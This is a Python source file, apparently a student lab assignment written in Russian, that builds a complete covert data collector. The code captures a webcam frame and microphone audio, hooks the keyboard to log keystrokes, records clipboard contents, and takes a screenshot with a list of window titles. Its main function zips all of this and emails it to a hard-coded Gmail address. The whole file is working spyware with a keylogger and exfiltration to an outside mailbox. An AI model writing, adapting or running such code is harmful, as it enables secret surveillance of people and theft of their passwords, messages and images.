import pyautogui
import pyaudio
import pygetwindow as gw
import wave
import keyboard
import pyperclip
import threading
import time
from datetime import datetime
import sys
import os
import cv2
import traceback
import json
from logger import DataCollectorLogger
from email_sender import send_gmail_with_attachment, create_zip_zipfile


FOLDER_NAME = 'data_collection'
FOLDER_PATH = os.path.join(os.getcwd(), FOLDER_NAME)


class DataCollector:
    def __init__(self):
        """Инициализация сборщика данных"""
        # Инициализация логгера
        self.logger = DataCollectorLogger(FOLDER_NAME, 'process_run.log')

        self.audio_data = []
        self.keys_pressed = []
        self.clipboard_history = []
        self.screenshot = None
        self.webcam_image = None
        self.recording = False
        self.audio_stream = None
        self.collection_time = 5  # 5 секунд

        # Пути к файлам
        self.webcam_path = os.path.join(FOLDER_PATH, 'webcam_capture.jpg')
        self.audio_path = os.path.join(FOLDER_PATH, 'audio_record.wav')
        self.screenshot_path = os.path.join(FOLDER_PATH, 'screenshot.png')
        self.keyboard_log_path = os.path.join(FOLDER_PATH, 'keyboard_log.txt')
        self.clipboard_log_path = os.path.join(FOLDER_PATH, 'clipboard_log.txt')
        self.screen_info_path = os.path.join(FOLDER_PATH, 'screen_info.txt')
        self.report_path = os.path.join(FOLDER_PATH, 'report.txt')
        self.metadata_path = os.path.join(FOLDER_PATH, 'metadata.json')

        self.logger.log_info("Инициализация DataCollector")
        self.logger.log_info(f"Папка для данных: {FOLDER_PATH}")

    def capture_webcam(self):
        """Захват изображения с веб-камеры"""
        func_name = "capture_webcam"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        try:
            self.logger.log_info("Попытка открыть веб-камеру...")

            # Пробуем разные индексы камер
            camera_found = False
            for camera_index in [0, 1, 2]:
                try:
                    cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
                    if cap.isOpened():
                        self.logger.log_info(f"Веб-камера найдена на индексе {camera_index}")
                        camera_found = True
                        break
                    else:
                        cap.release()
                except:
                    pass

            if not camera_found:
                self.logger.log_warning("Веб-камера не найдена")
                self.create_webcam_stub()
                self.logger.log_function_call(func_name, "НЕУДАЧА", "Веб-камера не найдена")
                return

            # Ждем инициализации камеры
            time.sleep(0.5)

            # Захватываем кадр
            ret, frame = cap.read()

            if ret:
                # Сохраняем изображение
                cv2.imwrite(self.webcam_path, frame)
                self.webcam_image = frame

                # Сохраняем резервную копию с временной меткой
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_path = os.path.join(FOLDER_PATH, f'webcam_{timestamp}.jpg')
                cv2.imwrite(backup_path, frame)

                self.logger.log_info(f"Изображение с веб-камеры сохранено: {self.webcam_path}")
                self.logger.log_info(f"Размер изображения: {frame.shape[1]}x{frame.shape[0]}")
                self.logger.log_function_call(func_name, "УСПЕХ", f"Размер: {frame.shape}")
            else:
                self.logger.log_error("Не удалось захватить кадр с веб-камеры")
                self.create_webcam_stub()
                self.logger.log_function_call(func_name, "НЕУДАЧА", "Не удалось захватить кадр")

            # Освобождаем камеру
            cap.release()
            cv2.destroyAllWindows()

        except Exception as e:
            self.logger.log_error(f"Ошибка при захвате с веб-камеры: {str(e)}")
            self.logger.log_debug(traceback.format_exc())
            self.create_webcam_stub()
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def create_webcam_stub(self):
        """Создание заглушки для веб-камеры"""
        func_name = "create_webcam_stub"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        try:
            import numpy as np

            # Создаем черное изображение с текстом
            stub_image = np.zeros((480, 640, 3), dtype=np.uint8)

            # Добавляем текст
            font = cv2.FONT_HERSHEY_SIMPLEX
            text = "ВЕБ-КАМЕРА НЕДОСТУПНА"
            text_size = cv2.getTextSize(text, font, 1, 2)[0]
            text_x = (640 - text_size[0]) // 2
            text_y = (480 + text_size[1]) // 2

            cv2.putText(stub_image, text, (text_x, text_y),
                        font, 1, (255, 255, 255), 2)

            cv2.imwrite(self.webcam_path, stub_image)
            self.logger.log_info(f"Создана заглушка веб-камеры: {self.webcam_path}")
            self.logger.log_function_call(func_name, "УСПЕХ")

        except Exception as e:
            self.logger.log_error(f"Ошибка при создании заглушки: {str(e)}")
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def record_audio(self):
        """Запись звука с микрофона"""
        func_name = "record_audio"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        try:
            p = pyaudio.PyAudio()

            # Логируем информацию об аудиоустройствах
            device_count = p.get_device_count()
            self.logger.log_info(f"Найдено аудиоустройств: {device_count}")

            for i in range(device_count):
                device_info = p.get_device_info_by_index(i)
                if device_info['maxInputChannels'] > 0:
                    self.logger.log_debug(f"  Устройство {i}: {device_info['name']}")

            # Открываем аудиопоток
            stream = p.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK,
                input_device_index=None  # Используем устройство по умолчанию
            )

            self.logger.log_info("Начало записи звука...")
            frames_recorded = 0

            while self.recording:
                try:
                    data = stream.read(CHUNK, exception_on_overflow=False)
                    self.audio_data.append(data)
                    frames_recorded += 1

                    # Логируем прогресс каждую секунду
                    if frames_recorded % (RATE // CHUNK) == 0:
                        seconds = frames_recorded // (RATE // CHUNK)
                        self.logger.log_debug(f"Записано {seconds} секунд звука")

                except Exception as e:
                    self.logger.log_warning(f"Ошибка при чтении аудиоданных: {str(e)}")
                    # Добавляем пустые данные при ошибке
                    self.audio_data.append(b'\x00' * CHUNK * 2)

            stream.stop_stream()
            stream.close()
            p.terminate()

            self.logger.log_info(f"Запись звука завершена. Всего фреймов: {frames_recorded}")

            # Сохраняем аудиофайл
            self.save_audio_file()
            self.logger.log_function_call(func_name, "УСПЕХ", f"Фреймов: {frames_recorded}")

        except Exception as e:
            self.logger.log_error(f"Ошибка при записи звука: {str(e)}")
            self.logger.log_debug(traceback.format_exc())
            self.create_audio_stub()
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def save_audio_file(self):
        """Сохранение аудиофайла"""
        func_name = "save_audio_file"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        if not self.audio_data:
            self.logger.log_warning("Нет аудиоданных для сохранения")
            self.logger.log_function_call(func_name, "НЕУДАЧА", "Нет данных")
            return

        try:
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100

            wf = wave.open(self.audio_path, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(2)
            wf.setframerate(RATE)
            wf.writeframes(b''.join(self.audio_data))
            wf.close()

            file_size = os.path.getsize(self.audio_path)
            self.logger.log_info(f"Аудиофайл сохранен: {self.audio_path} ({file_size} байт)")
            self.logger.log_function_call(func_name, "УСПЕХ", f"Размер: {file_size} байт")

        except Exception as e:
            self.logger.log_error(f"Ошибка при сохранении аудиофайла: {str(e)}")
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def create_audio_stub(self):
        """Создание заглушки для аудио"""
        func_name = "create_audio_stub"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        try:
            import struct

            RATE = 44100
            DURATION = self.collection_time
            total_samples = int(RATE * DURATION)

            # Создаем тихий звуковой сигнал
            silent_data = []
            for i in range(total_samples):
                value = int(100 * (i / 100) % 2 - 1)  # Маленький сигнал
                silent_data.append(struct.pack('<h', value))

            with wave.open(self.audio_path, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(RATE)
                wf.writeframes(b''.join(silent_data))

            file_size = os.path.getsize(self.audio_path)
            self.logger.log_info(f"Создана аудиозаглушка: {self.audio_path}")
            self.logger.log_function_call(func_name, "УСПЕХ", f"Размер: {file_size} байт")

        except Exception as e:
            self.logger.log_error(f"Ошибка при создании аудиозаглушки: {str(e)}")
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def take_screenshot(self):
        """Захват скриншота экрана"""
        func_name = "take_screenshot"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        try:
            screenshot = pyautogui.screenshot()
            screenshot.save(self.screenshot_path)
            self.screenshot = screenshot

            self.logger.log_info(f"Скриншот сохранен: {self.screenshot_path}")
            self.logger.log_info(f"Размер: {screenshot.size[0]}x{screenshot.size[1]}")

            # Анализируем экран
            self.detect_all_windows()
            self.logger.log_function_call(func_name, "УСПЕХ",
                                          f"Размер: {screenshot.size[0]}x{screenshot.size[1]}")

        except Exception as e:
            self.logger.log_error(f"Ошибка при захвате скриншота: {str(e)}")
            self.logger.log_debug(traceback.format_exc())
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def detect_all_windows(self):
        """Определение всех открытых окон"""
        func_name = "detect_all_windows"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        try:
            windows = gw.getAllWindows()

            with open(self.screen_info_path, "w", encoding="utf-8") as f:
                f.write("СПИСОК ВСЕХ ОТКРЫТЫХ ОКОН\n")
                f.write("=" * 60 + "\n")
                f.write(f"Время анализа: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

                count = 0
                for win in windows:
                    try:
                        # bỏ qua cửa sổ không có tên hoặc kích thước 0 (ẩn / bị minimize)
                        if not win.title or win.width <= 0 or win.height <= 0:
                            continue

                        count += 1

                        f.write(f"Окно #{count}\n")
                        f.write(f"  Название : {win.title}\n")
                        f.write(f"  Позиция  : x={win.left}, y={win.top}\n")
                        f.write(f"  Размер   : width={win.width}, height={win.height}\n")
                        f.write(f"  Границы  : left={win.left}, top={win.top}, "
                                f"right={win.right}, bottom={win.bottom}\n\n")

                        self.logger.log_debug(
                            f"Window '{win.title}' pos=({win.left},{win.top}) size=({win.width}x{win.height})"
                        )

                    except Exception as e:
                        self.logger.log_warning(f"Ошибка при обработке окна: {e}")

                if count == 0:
                    f.write("Не найдено ни одного видимого окна.\n")

            self.logger.log_info(f"Найдено окон: {count}")
            self.logger.log_function_call(func_name, "УСПЕХ")

        except Exception as e:
            self.logger.log_error(f"Ошибка при анализе окон: {str(e)}")
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def monitor_clipboard(self):
        """Мониторинг буфера обмена"""
        func_name = "monitor_clipboard"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        last_clipboard = ""
        changes_count = 0

        while self.recording:
            try:
                current_clipboard = pyperclip.paste()
                if current_clipboard != last_clipboard:
                    if current_clipboard.strip():
                        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
                        self.clipboard_history.append({
                            'time': timestamp,
                            'content': current_clipboard
                        })
                        changes_count += 1

                        self.logger.log_debug(f"Буфер обмена изменен [{timestamp}]: "
                                              f"{len(current_clipboard)} символов")

                        preview = current_clipboard[:50] + "..." if len(current_clipboard) > 50 else current_clipboard
                        self.logger.log_debug(f"Превью: {preview}")

                    last_clipboard = current_clipboard

            except Exception as e:
                self.logger.log_warning(f"Ошибка при чтении буфера обмена: {str(e)}")

            time.sleep(0.1)

        self.logger.log_info(f"Всего изменений буфера обмена: {changes_count}")
        self.logger.log_function_call(func_name, "ЗАВЕРШЕНО", f"Изменений: {changes_count}")

    def keyboard_callback(self, event):
        """Обработчик событий клавиатуры"""
        if self.recording and hasattr(event, 'name'):
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            self.keys_pressed.append({
                'time': timestamp,
                'key': event.name,
                'event': event.event_type
            })

            # Логируем специальные клавиши
            if len(event.name) > 1:
                self.logger.log_debug(f"Специальная клавиша: {event.name} ({event.event_type})")

    def start_monitoring(self):
        """Начало мониторинга"""
        func_name = "start_monitoring"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        self.logger.log_info("=" * 70)
        self.logger.log_info("НАЧАЛО СБОРА ДАННЫХ")
        self.logger.log_info("=" * 70)
        self.logger.log_info(f"Продолжительность: {self.collection_time} секунд")
        self.logger.log_info(f"Папка для данных: {FOLDER_PATH}")

        self.recording = True
        start_time = time.time()

        # ШАГ 1: ВЕБ-КАМЕРА
        self.logger.log_info("\n[1] ЗАХВАТ С ВЕБ-КАМЕРЫ")
        webcam_thread = threading.Thread(target=self.capture_webcam)
        webcam_thread.start()
        webcam_thread.join(timeout=3)

        # ШАГ 2: ЗАПУСК ПОТОКОВ СБОРА ДАННЫХ
        threads = []

        # Запись звука
        self.logger.log_info("\n[2] НАЧАЛО ЗАПИСИ ЗВУКА")
        audio_thread = threading.Thread(target=self.record_audio)
        audio_thread.start()
        threads.append(audio_thread)

        # Мониторинг буфера обмена
        self.logger.log_info("[3] МОНИТОРИНГ БУФЕРА ОБМЕНА")
        clipboard_thread = threading.Thread(target=self.monitor_clipboard)
        clipboard_thread.start()
        threads.append(clipboard_thread)

        # Мониторинг клавиатуры
        self.logger.log_info("[4] МОНИТОРИНГ КЛАВИАТУРЫ")
        keyboard.hook(self.keyboard_callback)

        self.logger.log_info("\n" + "=" * 70)
        self.logger.log_info("ИДЕТ СБОР ДАННЫХ...")
        self.logger.log_info("=" * 70 + "\n")

        # Обратный отсчет
        for i in range(self.collection_time, 0, -1):
            if not self.recording:
                break
            self.logger.log_info(f"Осталось {i} секунд...")
            time.sleep(1)

        # Остановка сбора данных
        self.recording = False
        elapsed_time = time.time() - start_time

        # ШАГ 5: СКРИНШОТ ЭКРАНА
        self.logger.log_info("\n[5] ЗАХВАТ СКРИНШОТА ЭКРАНА")
        self.take_screenshot()

        # Ожидание завершения потоков
        self.logger.log_info("\n[6] ЗАВЕРШЕНИЕ ПРОЦЕССОВ...")
        for thread in threads:
            thread.join(timeout=2)

        # Отключение отслеживания клавиатуры
        keyboard.unhook_all()

        self.logger.log_info(f"\nФактическое время: {elapsed_time:.2f} секунд")
        self.logger.log_info("=" * 70)
        self.logger.log_info("СБОР ДАННЫХ ЗАВЕРШЕН")
        self.logger.log_info("=" * 70)

        # Сохранение данных
        self.save_data()
        self.save_metadata(elapsed_time)

        self.logger.log_function_call(func_name, "ЗАВЕРШЕНО", f"Время: {elapsed_time:.2f}с")

    def save_data(self):
        """Сохранение всех данных"""
        func_name = "save_data"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        self.logger.log_info("\nСОХРАНЕНИЕ ДАННЫХ...")

        # Сохранение истории клавиатуры
        try:
            with open(self.keyboard_log_path, "w", encoding="utf-8") as f:
                f.write("ИСТОРИЯ КЛАВИАТУРЫ\n")
                f.write("=" * 70 + "\n")
                f.write(f"Всего событий: {len(self.keys_pressed)}\n")

                key_down_events = [k for k in self.keys_pressed if k['event'] == 'down']
                f.write(f"Нажатий клавиш: {len(key_down_events)}\n\n")

                if self.keys_pressed:
                    f.write("ДЕТАЛЬНЫЕ СОБЫТИЯ:\n")
                    f.write("-" * 70 + "\n")
                    for keypress in self.keys_pressed:
                        f.write(f"{keypress['time']} - {keypress['event']}: {keypress['key']}\n")

                    buffer_str = " ".join([keypress['key'] for keypress in key_down_events])
                    f.write("\nСОБРАННЫЙ ТЕКСТ:\n")
                    f.write("-" * 70 + "\n")
                    f.write(buffer_str + "\n")

                else:
                    f.write("События клавиатуры не зарегистрированы\n")

            self.logger.log_info(f"✓ История клавиатуры сохранена: {self.keyboard_log_path}")
        except Exception as e:
            self.logger.log_error(f"✗ Ошибка сохранения истории клавиатуры: {str(e)}")

        # Сохранение истории буфера обмена
        try:
            with open(self.clipboard_log_path, "w", encoding="utf-8") as f:
                f.write("ИСТОРИЯ БУФЕРА ОБМЕНА\n")
                f.write("=" * 70 + "\n")
                f.write(f"Всего изменений: {len(self.clipboard_history)}\n\n")

                if self.clipboard_history:
                    for item in self.clipboard_history:
                        f.write(f"ВРЕМЯ: {item['time']}\n")
                        f.write(f"СОДЕРЖИМОЕ ({len(item['content'])} символов):\n")
                        f.write("-" * 50 + "\n")
                        f.write(item['content'])
                        f.write("\n" + "=" * 70 + "\n\n")
                else:
                    f.write("Изменений буфера обмена не было\n")

            self.logger.log_info(f"✓ История буфера обмена сохранена: {self.clipboard_log_path}")
        except Exception as e:
            self.logger.log_error(f"✗ Ошибка сохранения истории буфера обмена: {str(e)}")

        # Создание отчета
        self.create_report()
        self.logger.log_function_call(func_name, "ЗАВЕРШЕНО")

    def create_report(self):
        """Создание итогового отчета"""
        func_name = "create_report"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        try:
            report = f"""
            {'=' * 80}
            ОТЧЕТ О СБОРЕ ДАННЫХ - ЛАБОРАТОРНАЯ РАБОТА 5
            {'=' * 80}

            ОБЩАЯ ИНФОРМАЦИЯ:
            - Время начала: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            - Продолжительность сбора: {self.collection_time} секунд
            - Папка с данными: {FOLDER_PATH}

            {'-' * 80}
            1. ИЗОБРАЖЕНИЕ С ВЕБ-КАМЕРЫ:
               - Файл: {os.path.basename(self.webcam_path)}
               - Статус: {'УСПЕШНО' if os.path.exists(self.webcam_path) else 'НЕУДАЧА'}

            2. ЗАПИСЬ С МИКРОФОНА:
               - Файл: {os.path.basename(self.audio_path)}
               - Статус: {'УСПЕШНО' if os.path.exists(self.audio_path) else 'НЕУДАЧА'}
               - Размер: {os.path.getsize(self.audio_path) if os.path.exists(self.audio_path) else 0} байт

            3. СКРИНШОТ ЭКРАНА:
               - Файл: {os.path.basename(self.screenshot_path)}
               - Статус: {'УСПЕШНО' if os.path.exists(self.screenshot_path) else 'НЕУДАЧА'}

            4. АКТИВНОСТЬ КЛАВИАТУРЫ:
               - Файл: {os.path.basename(self.keyboard_log_path)}
               - Всего событий: {len(self.keys_pressed)}
               - Нажатий клавиш: {len([k for k in self.keys_pressed if k['event'] == 'down'])}

            5. ИСТОРИЯ БУФЕРА ОБМЕНА:
               - Файл: {os.path.basename(self.clipboard_log_path)}
               - Изменений: {len(self.clipboard_history)}

            6. ИНФОРМАЦИЯ О ЭКРАНЕ:
               - Файл: {os.path.basename(self.screen_info_path)}

            {'-' * 80}
            ДЛЯ ЗАЩИТЫ ЛАБОРАТОРНОЙ РАБОТЫ:

            1. Откройте файл {os.path.basename(self.screenshot_path)} для определения положения окна
            2. Проверьте файл {os.path.basename(self.clipboard_log_path)} для содержимого буфера обмена
            3. Проверьте файл {os.path.basename(self.keyboard_log_path)} для нажатых клавиш
            4. Прослушайте файл {os.path.basename(self.audio_path)} для определения песни
            5. Откройте файл {os.path.basename(self.webcam_path)} для изображения с веб-камеры

            {'=' * 80}
            """

            with open(self.report_path, "w", encoding="utf-8") as f:
                f.write(report)

            self.logger.log_info(f"✓ Отчет создан: {self.report_path}")
            self.logger.log_function_call(func_name, "УСПЕХ")

        except Exception as e:
            self.logger.log_error(f"✗ Ошибка создания отчета: {str(e)}")
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))

    def save_metadata(self, elapsed_time):
        """Сохранение метаданных в формате JSON"""
        func_name = "save_metadata"
        self.logger.log_function_call(func_name, "НАЧАЛО")

        try:
            metadata = {
                "информация_о_сборе": {
                    "время_начала": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    "длительность_секунды": self.collection_time,
                    "фактическая_длительность": round(elapsed_time, 2),
                    "папка_с_данными": FOLDER_PATH
                },
                "созданные_файлы": {
                    "веб_камера": {
                        "путь": self.webcam_path,
                        "существует": os.path.exists(self.webcam_path),
                        "размер": os.path.getsize(self.webcam_path) if os.path.exists(self.webcam_path) else 0
                    },
                    "аудио": {
                        "путь": self.audio_path,
                        "существует": os.path.exists(self.audio_path),
                        "размер": os.path.getsize(self.audio_path) if os.path.exists(self.audio_path) else 0
                    },
                    "скриншот": {
                        "путь": self.screenshot_path,
                        "существует": os.path.exists(self.screenshot_path),
                        "размер": os.path.getsize(self.screenshot_path) if os.path.exists(self.screenshot_path) else 0
                    },
                    "лог_клавиатуры": {
                        "путь": self.keyboard_log_path,
                        "существует": os.path.exists(self.keyboard_log_path)
                    },
                    "лог_буфера_обмена": {
                        "путь": self.clipboard_log_path,
                        "существует": os.path.exists(self.clipboard_log_path)
                    }
                },
                "статистика": {
                    "события_клавиатуры": len(self.keys_pressed),
                    "нажатия_клавиш": len([k for k in self.keys_pressed if k['event'] == 'down']),
                    "изменения_буфера": len(self.clipboard_history),
                    "аудио_чанков": len(self.audio_data)
                },
                "системная_информация": {
                    "ширина_экрана": pyautogui.size()[0],
                    "высота_экрана": pyautogui.size()[1],
                    "версия_python": sys.version,
                    "платформа": sys.platform
                }
            }

            with open(self.metadata_path, "w", encoding="utf-8") as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)

            self.logger.log_info(f"✓ Метаданные сохранены: {self.metadata_path}")
            self.logger.log_function_call(func_name, "УСПЕХ")

        except Exception as e:
            self.logger.log_error(f"✗ Ошибка сохранения метаданных: {str(e)}")
            self.logger.log_function_call(func_name, "ОШИБКА", str(e))


# ==================== ОСНОВНАЯ ФУНКЦИЯ ====================
def main():
    """Основная функция программы"""
    try:
        # Инициализация и запуск сборщика
        collector = DataCollector()
        collector.start_monitoring()

        sender_email = "mokaiv118@gmail.com"
        sender_password = "xxxx xxxx xxxx xxxx"  # пароль приложения
        recipient_email = "mokaiv118@gmail.com"
        subject = "5 секунд"
        message = "Привет! Это письмо содержит архив 5ти секунд."
        create_zip_zipfile("data_collection", "data_collection.zip")

        file_path = "data_collection.zip"  
        
        send_gmail_with_attachment(
            sender_email=sender_email,
            sender_password=sender_password,
            recipient_email=recipient_email,
            subject=subject,
            message=message,
            attachment_path=file_path
        )


    except KeyboardInterrupt:
        pass
    except Exception as e:
        pass
        traceback.print_exc()
        input("\nНажмите Enter для выхода...")


if __name__ == "__main__":
    main()
